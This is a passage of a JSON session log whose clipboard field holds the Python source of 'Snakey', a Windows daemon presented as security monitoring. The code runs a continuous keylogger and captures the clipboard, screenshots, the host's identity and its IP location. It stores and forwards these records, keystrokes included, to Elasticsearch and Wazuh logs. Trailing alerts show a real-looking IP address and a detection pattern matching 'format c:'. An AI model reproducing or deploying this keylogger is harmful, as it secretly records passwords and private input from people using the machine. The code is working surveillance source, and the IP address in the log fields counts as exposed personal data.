hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes: list[str]) -> str | None:\r\n    \"\"\"Builds a Merkle tree from a list of hashes and returns the Merkle root.\"\"\"\r\n    if not hashes:\r\n        return None\r\n    hashes = list(hashes) # Make a mutable copy\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url: str) -> dict:\r\n    \"\"\"Performs a VirusTotal URL lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping URL lookup.\", extra={\"url\": url})\r\n            return {}\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests_get(f\"{VT_URL_LOOKUP}{url_id}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\", extra={\"url_hash\": url_id})\r\n        else:\r\n            logger.warning(f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\", extra={\"url\": url, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT URL lookup failed: {e}\", exc_info=True, extra={\"url\": url})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT URL lookup: {e}\", exc_info=True, extra={\"url\": url})\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path: str) -> dict:\r\n    \"\"\"Performs a VirusTotal file lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping File lookup.\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        if not os.path.exists(file_path):\r\n            logger.error(f\"File not found for VT lookup: {file_path}\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:\r\n            return {}\r\n\r\n        response = requests_get(f\"{VT_FILE_LOOKUP}{file_hash}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\", extra={\"file_hash\": file_hash, \"file_path\": file_path})\r\n        else:\r\n            logger.warning(f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\", extra={\"file_path\": file_path, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT File lookup failed: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT File lookup: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    return {}\r\n\r\n\r\ndef check_important_directories() -> dict[str, str]:\r\n    \"\"\"Checks the status of important user directories.\"\"\"\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n                logger.warning(f\"Failed to list contents of {name} ({path}): {e}\", extra={\"dir_name\": name, \"dir_path\": path})\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file() -> bool:\r\n    \"\"\"Checks if the 'stop_snakey.txt' file exists to terminate the daemon.\"\"\"\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef check_disk_space(path: str, min_free_mb: int) -> bool:\r\n    \"\"\"Checks if there's enough free disk space at a given path.\"\"\"\r\n    try:\r\n        total, used, free = shutil.disk_usage(path)\r\n        free_mb = free / (1024 * 1024)\r\n        if free_mb < min_free_mb:\r\n            logger.warning(f\"Low disk space detected in {path}: {free_mb:.2f} MB free. Operations might be impacted.\", extra={\"path\": path, \"free_mb\": free_mb, \"min_free_mb\": min_free_mb})\r\n            return False\r\n        logger.debug(f\"Disk space OK in {path}: {free_mb:.2f} MB free.\")\r\n        return True\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check disk space for {path}: {e}\", exc_info=True, extra={\"path\": path})\r\n        return True # Assume OK if check fails, to avoid halting the daemon\r\n\r\ndef log_to_wazuh_file(data: dict):\r\n    \"\"\"Logs session data to a file in a Wazuh-compatible JSON format.\"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(data, default=str) + \"\\n\")\r\n        logger.info(\"Log written to Wazuh-compatible file.\", extra={\"log_file\": wazuh_log_file})\r\n    except Exception as e:\r\n        logger.error(f\"Wazuh log file write failed: {e}\", exc_info=True, extra={\"log_file\": wazuh_log_file})\r\n\r\ndef save_session_to_json(session_data: dict, filepath: str):\r\n    \"\"\"\r\n    Appends session data as a new JSON object to the specified file.\r\n    Each object is on a new line to make it easier to read/parse as NDJSON.\r\n    \"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in session_data and isinstance(session_data['timestamp'], datetime):\r\n            session_data['timestamp'] = session_data['timestamp'].isoformat()\r\n        \r\n        with open(filepath, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(session_data, default=str) + \"\\n\")\r\n        logger.info(f\"Session log appended to JSON file: {filepath}\", extra={\"log_file\": filepath})\r\n    except Exception as e:\r\n        logger.error(f\"Failed to write session log to JSON file {filepath}: {e}\", exc_info=True, extra={\"log_file\": filepath})\r\n\r\ndef send_to_elasticsearch(data: dict):\r\n    \"\"\"Sends collected session data to Elasticsearch.\"\"\"\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty for Kibana visualization (empty list is fine, None is bad)\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []\r\n            if not data_to_send.get('virustotal'):\r\n                data_to_send['virustotal'] = {}\r\n\r\n            logger.debug(f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\", extra={\"timestamp\": data_to_send['timestamp']})\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            logger.info(f\"Log sent to Elasticsearch. ID: {response['_id']}\", extra={\"es_id\": response['_id']})\r\n        except ConnectionError as e:\r\n            logger.error(f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        except AuthenticationException as e:\r\n            logger.error(f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        except TransportError as e:\r\n            logger.error(f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code, \"es_info\": e.info})\r\n        except Exception as e:\r\n            logger.error(f\"Unexpected failure sending log to Elasticsearch: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_send_error\"})\r\n    else:\r\n        logger.warning(\"Elasticsearch client is not configured or connected. Log will not be sent.\")\r\n\r\n\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Analyzes clipboard content for predefined sensitive command patterns.\"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            logger.info(f\"Sensitive CMD command detected in clipboard.\", extra={\"matched_command\": sensitive_cmd, \"clipboard_snippet\": clipboard_content[:100]})\r\n\r\n    return alerts_list\r\n\r\n\r\ndef check_country_change(current_country: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    last_country_path = os.path.join(base_path, \"last_country.txt\")\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\", encoding='utf-8') as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                logger.info(f\"Country changed: {last_country} -> {current_country}\", extra={\"old_country\": last_country, \"new_country\": current_country})\r\n        with open(last_country_path, \"w\", encoding='utf-8') as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check/update last country: {e}\", exc_info=True)\r\n    return alerts_list\r\n\r\n\r\ndef check_vpn_proxy_ip(current_ip: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Checks if the current public IP is in a list of known VPN/proxy IPs.\"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        logger.info(f\"Access from known VPN/proxy IP detected: {current_ip}\", extra={\"ip_address\": current_ip})\r\n    return alerts_list\r\n\r\n\r\n# === Keylogger Thread Function ===\r\ndef on_press_threaded(key):\r\n    \"\"\"Callback for pynput.keyboard.Listener on key press event.\"\"\"\r\n    global KEYLOGGER_KEYS\r\n    try:\r\n        if hasattr(key, 'char') and key.char is not None:\r\n            KEYLOGGER_KEYS.append(key.char)\r\n        elif key == Key.space:\r\n            KEYLOGGER_KEYS.append(' ')\r\n        elif key == Key.enter:\r\n            KEYLOGGER_KEYS.append('[ENTER]')\r\n        elif key == Key.backspace:\r\n            KEYLOGGER_KEYS.append('[BACKSPACE]')\r\n        elif key == Key.tab:\r\n            KEYLOGGER_KEYS.append('[TAB]')\r\n        else:\r\n            KEYLOGGER_KEYS.append(f\"[{str(key).replace('Key.', '')}]\")\r\n    except Exception as e:\r\n        logger.error(f\"Error in on_press_threaded keylogger: {e}\", exc_info=True)\r\n\r\ndef keylogger_thread_func():\r\n    \"\"\"Function to be run in a separate thread for continuous keylogging.\"\"\"\r\n    global KEYLOGGER_LISTENER\r\n    logger.info(\"Keylogger thread started.\")\r\n    try:\r\n        with Listener(on_press=on_press_threaded) as KEYLOGGER_LISTENER:\r\n            KEYLOGGER_LISTENER.join() # This will block until listener.stop() is called\r\n    except Exception as e:\r\n        logger.critical(f\"Keylogger thread encountered a critical error: {e}. Keylogger will terminate.\", exc_info=True)\r\n    finally:\r\n        logger.info(\"Keylogger thread terminated.\")\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session() -> dict:\r\n    \"\"\"Collects a full session's worth of system data, activities, and alerts.\"\"\"\r\n    current_time = datetime.now(timezone.utc)\r\n    session_log: dict = {\r\n        \"timestamp\": current_time.isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\", # Will be populated from global KEYLOGGER_KEYS\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n            logger.warning(f\"Could not get private IP: {e}\", extra={\"error\": str(e)})\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip: str | None = None\r\n        current_country: str | None = None\r\n        try:\r\n            ip_info_response = requests_get(\"https://ipinfo.io/json\", timeout=5)\r\n            ip_info_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)\r\n            ip_info = ip_info_response.json()\r\n\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if current_country and current_country not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {current_country}\")\r\n                logger.info(f\"Access from untrusted country: {current_country}\", extra={\"country\": current_country})\r\n\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            logger.warning(\"IP info lookup timed out.\", extra={\"error_type\": \"ipinfo_timeout\"})\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            logger.error(f\"IP info lookup failed: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_request_error\"})\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            logger.error(f\"Unexpected error during IP info lookup: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_unexpected_error\"})\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info collection error: {e}\")\r\n        logger.error(f\"System info collection error: {e}\", exc_info=True)\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(str(session_log[\"clipboard\"])) # Ensure clipboard is string before hashing\r\n\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            logger.error(f\"Clipboard error: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        logger.info(\"Clipboard collection skipped (not Windows).\")\r\n\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_file_path = os.path.join(base_path, screenshot_information)\r\n    if platform.system() == \"Windows\":\r\n        # Check disk space before attempting screenshot\r\n        if not check_disk_space(base_path, MIN_FREE_DISK_MB):\r\n            session_log[\"alerts\"].append(\"Screenshot skipped due to low disk space.\")\r\n            logger.warning(\"Screenshot skipped due to low disk space.\")\r\n        else:\r\n            try:\r\n                im = ImageGrab.grab()\r\n                im.save(screenshot_file_path)\r\n                session_log[\"screenshot_taken\"] = True\r\n                session_log[\"screenshot_hash\"] = hash_file(screenshot_file_path)\r\n\r\n                vt_result = vt_lookup_file(screenshot_file_path)\r\n                if vt_result:\r\n                    session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                    if vt_result.get(\"malicious\", 0) > 0:\r\n                        session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                        logger.info(f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n                else:\r\n                    logger.info(\"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n            except Exception as e:\r\n                session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n                logger.error(f\"Screenshot error: {e}\", exc_info=True)\r\n            finally:\r\n                if os.path.exists(screenshot_file_path):\r\n                    try:\r\n                        os.remove(screenshot_file_path)\r\n                        logger.debug(f\"Removed temporary screenshot file: {screenshot_file_path}\")\r\n                    except Exception as e:\r\n                        logger.error(f\"Failed to remove temporary screenshot file: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n        logger.info(\"Screenshot collection skipped (not Windows).\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith((\"http://\", \"https://\")):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                logger.info(f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n        else:\r\n            logger.info(\"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger: Collect accumulated keys from the dedicated keylogger thread\r\n    global KEYLOGGER_KEYS\r\n    session_log[\"keystrokes\"] = ''.join(KEYLOGGER_KEYS)\r\n    KEYLOGGER_KEYS = [] # Reset for the next collection cycle\r\n    logger.info(f\"Collected {len(session_log['keystrokes'])} keystrokes from keylogger thread.\")\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    if not check_disk_space(encrypted_path, MIN_FREE_DISK_MB):\r\n        session_log[\"alerts\"].append(\"Encryption and ledger update skipped due to low disk space.\")\r\n        logger.error(\"Encryption and ledger update skipped due to low disk space in encrypted_path.\")\r\n        return session_log # Exit without updating ledger for this log\r\n\r\n    try:\r\n        # 1. Prepare the full log for encryption\r\n        log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n        session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)\r\n\r\n        # 2. Encrypt the entire session log\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file (Atomic Write)\r\n        temp_enc_file_path = os.path.join(encrypted_path, f\".{encrypted_filename}.tmp\")\r\n        try:\r\n            with tempfile.NamedTemporaryFile(mode='wb', delete=False, dir=encrypted_path) as temp_f: # mode 'wb' for binary data\r\n                temp_f.write(encrypted_log_data)\r\n            shutil.move(temp_f.name, full_encrypted_filepath)\r\n            logger.info(f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n        except Exception as e:\r\n            logger.error(f\"Failed to save encrypted log atomically: {e}\", exc_info=True, extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(f\"Failed to save encrypted log: {e}\")\r\n            if os.path.exists(temp_enc_file_path):\r\n                os.remove(temp_enc_file_path)\r\n            return session_log # Critical failure, return\r\n\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            logger.error(\"Failed to hash encrypted log file. Ledger will not be updated with this log.\", extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(\"Failed to hash encrypted log file. Ledger not updated.\")\r\n            return session_log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger: list[dict] = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\", encoding='utf-8') as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed (list of hashes -> list of dicts)\r\n                    if ledger and isinstance(ledger[0], str):\r\n                        logger.info(\"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": datetime.now(timezone.utc).isoformat(), # Use current time for legacy entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        logger.info(\"Legacy hash ledger converted successfully.\")\r\n                except json.JSONDecodeError:\r\n                    logger.warning(\"Existing hash ledger file is corrupt. Starting with empty ledger.\", extra={\"file_path\": hash_ledger_path})\r\n                    ledger = []\r\n                except Exception as e:\r\n                    logger.error(f\"Error loading/converting hash ledger: {e}. Starting with empty ledger.\", exc_info=True, extra={\"file_path\": hash_ledger_path})\r\n                    ledger = [] # Start fresh on unexpected error\r\n\r\n            # Determine previous_encrypted_file_hash robustly\r\n            previous_encrypted_file_hash = \"0\" * 64\r\n            if ledger:\r\n                last_entry = ledger[-1]\r\n                if isinstance(last_entry, dict) and \"encrypted_file_hash\" in last_entry:\r\n                    previous_encrypted_file_hash = last_entry[\"encrypted_file_hash\"]\r\n                else:\r\n                    logger.warning(\"Last entry in hash ledger is malformed or missing 'encrypted_file_hash'. Using default previous hash ('0'*64).\", extra={\"last_ledger_entry\": str(last_entry)}) # Convert last_entry to str to avoid issues if it's complex/non-serializable\r\n            \r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            # Save the updated ledger (Atomic Write)\r\n            temp_ledger_path = os.path.join(base_path, \"hash_ledger_temp.json\")\r\n            try:\r\n                with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f:\r\n                    json.dump(ledger, temp_f, indent=4)\r\n                shutil.move(temp_f.name, hash_ledger_path)\r\n                logger.info(\"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n            except Exception as e:\r\n                logger.error(f\"Atomic write failed for hash ledger: {e}\", exc_info=True, extra={\"temp_path\": temp_ledger_path, \"target_path\": hash_ledger_path})\r\n                session_log[\"alerts\"].append(f\"Failed to update hash ledger atomically: {e}\")\r\n                if os.path.exists(temp_f.name):\r\n                    os.remove(temp_f.name)\r\n                # Fallback: try non-atomic write (less safe)\r\n                try:\r\n                    with open(hash_ledger_path, \"w\", encoding='utf-8') as f:\r\n                        json.dump(ledger, f, indent=4)\r\n                    logger.warning(\"Hash ledger updated with non-atomic write due to previous error.\", extra={\"target_path\": hash_ledger_path})\r\n                except Exception as fallback_e:\r\n                    logger.error(f\"Failed to write hash ledger even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": hash_ledger_path})\r\n                    session_log[\"alerts\"].append(f\"CRITICAL: Failed to write hash ledger even with fallback: {fallback_e}\")\r\n\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            if merkle_root:\r\n                # Save the Merkle root (Atomic Write)\r\n                temp_merkle_path = os.path.join(base_path, \"merkle_root_temp.txt\")\r\n                try:\r\n                    with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f_merkle:\r\n                        temp_f_merkle.write(merkle_root)\r\n                    shutil.move(temp_f_merkle.name, merkle_root_path)\r\n                    logger.info(\"Merkle root saved (based on encrypted file hashes).\")\r\n                except Exception as e:\r\n                    logger.error(f\"Atomic write failed for Merkle root: {e}\", exc_info=True, extra={\"temp_path\": temp_merkle_path, \"target_path\": merkle_root_path})\r\n                    session_log[\"alerts\"].append(f\"Failed to save Merkle root atomically: {e}\")\r\n                    if os.path.exists(temp_f_merkle.name):\r\n                        os.remove(temp_f_merkle.name)\r\n                    # Fallback\r\n                    try:\r\n                        with open(merkle_root_path, \"w\", encoding='utf-8') as f:\r\n                            f.write(merkle_root)\r\n                        logger.warning(\"Merkle root updated with non-atomic write due to previous error.\", extra={\"target_path\": merkle_root_path})\r\n                    except Exception as fallback_e:\r\n                        logger.error(f\"Failed to write Merkle root even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": merkle_root_path})\r\n                        session_log[\"alerts\"].append(f\"CRITICAL: Failed to write Merkle root even with fallback: {fallback_e}\")\r\n            else:\r\n                logger.warning(\"Merkle root could not be built (no hashes).\")\r\n\r\n\r\n        except Exception as e:\r\n            logger.error(f\"Failed to update hash ledger or Merkle root: {e}\", exc_info=True)\r\n            session_log[\"alerts\"].append(f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        logger.error(f\"Encryption or encrypted file save error: {e}\", exc_info=True)\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    logger.info(\"Starting Snakey in daemon mode...\")\r\n\r\n    # Start keylogger in a separate, persistent daemon thread\r\n    keylogger_thread = threading.Thread(target=keylogger_thread_func, daemon=True)\r\n    keylogger_thread.start()\r\n    logger.info(\"Keylogger thread initialized.\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        logger.info(\"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            logger.error(f\"Failed to remove existing stop file: {e}\", exc_info=True)\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            logger.info(\"Snakey terminated by stop_snakey.txt file.\")\r\n            # Gracefully stop keylogger thread\r\n            if KEYLOGGER_LISTENER:\r\n                logger.info(\"Stopping keylogger listener.\")\r\n                KEYLOGGER_LISTENER.stop()\r\n            break # Exit main loop\r\n\r\n        try:\r\n            session_log = collect_full_session() # Gathers all data, encrypts, updates ledger\r\n\r\n            # Send data to Elasticsearch (if connected)\r\n            send_to_elasticsearch(session_log)\r\n\r\n            # Save data to local JSON log file\r\n            save_session_to_json(session_log, json_log_path)\r\n\r\n            # Log to Wazuh-compatible file\r\n            log_to_wazuh_file(session_log)\r\n\r\n        except Exception as e:\r\n            logger.critical(f\"An unhandled error occurred in the main daemon loop: {e}\", exc_info=True)\r\n            # No `extra` here, as this is the top-level handler\r\n            session_log[\"alerts\"].append(f\"CRITICAL: Unhandled error in main loop: {e}\") # Add to log if possible\r\n\r\n        # Sleep for the configured interval\r\n        logger.info(f\"Sleeping for {config['time_sleep_seconds']} seconds before next collection at {datetime.now(timezone.utc).isoformat()}...\")\r\n        time.sleep(config['time_sleep_seconds'])\r\n\r\n    logger.info(\"Snakey daemon has stopped.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r 